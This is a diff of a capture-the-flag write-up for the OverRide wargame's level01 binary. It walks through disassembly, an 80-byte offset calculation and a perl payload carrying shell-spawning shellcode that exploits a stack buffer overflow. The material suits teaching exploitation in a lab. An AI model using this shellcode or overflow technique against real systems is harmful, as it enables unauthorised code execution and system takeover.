@@ -2,7 +2,7 @@
 
 The program reads username and password from stdin and always prints incorrect password.
 
-## Step 1 Find the right username and password
+## Step 1. Find the right username and password
 ```assembly
 level01@OverRide:~$ gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble verify_user_name" level01
 [...]
@@ -43,8 +43,9 @@ nope, incorrect password...
 ```
 The username is correct, but we couldn't login.
 
-## Step 2 Calculate the offset to overwrite `eip`
+## Step 2. Calculate offset to overwrite `eip`
 ```assembly
+0x080484d5 <+5>:	and    esp,0xfffffff0
 0x080484d8 <+8>:	sub    esp,0x60
 [...]
 0x0804856d <+157>:	lea    eax,[esp+0x1c]
@@ -55,18 +56,9 @@ The username is correct, but we couldn't login.
 0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
 [...]
 ```
-```
-bottom of                                                            top of
-memory                                                               memory
-         esp+0x1c          esp+0x60
-<------     [ local variables ][ padding ][ ebp ][ return addr ]
-                  64 + 4            8        4          4
-top of                                                            bottom of
-stack                                                                 stack
-```
-The username buffer is a global variable, we cannot use it to overwrite eip. According to disassembly, the binary stores password to a buffer which begins at esp+0x1c, so we need `0x60 - 0x1c + 0x8 + 0x4 = 0x50 (80)` to reach the return address.
+The username buffer is a global variable, we cannot use it to overwrite eip. According to disassembly, the binary stores password to a buffer which begins at esp+0x1c, so we need `0x60 - 0x1c + 0x8(padding) + 0x4(ebp) = 0x50 (80)` to reach the return address.
 
-## Step 3 Find a place to inject shellcode
+## Step 3. Find a place to inject shellcode
 ```
 level01@OverRide:~$ objdump -j .bss -d level01
 [...]
@@ -74,7 +66,7 @@ level01@OverRide:~$ objdump -j .bss -d level01
 ```
 `0x0804a040` is the address of global variable `a_user_name` which stores input username, we concatenate [shellcode](http://shell-storm.org/shellcode/files/shellcode-219.php) after the username `dat_wil` then use the address `0x0804a040 + 0x7` to access it.
 
-## Step 4 Build the payload
+## Step 4. Build payload
 ```
 level01@OverRide:~$ perl -e 'print "dat_wil\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80\n" . "A"x80 . pack("V", 0x804a047)' | ./level01
 ********* ADMIN LOGIN PROMPT *********
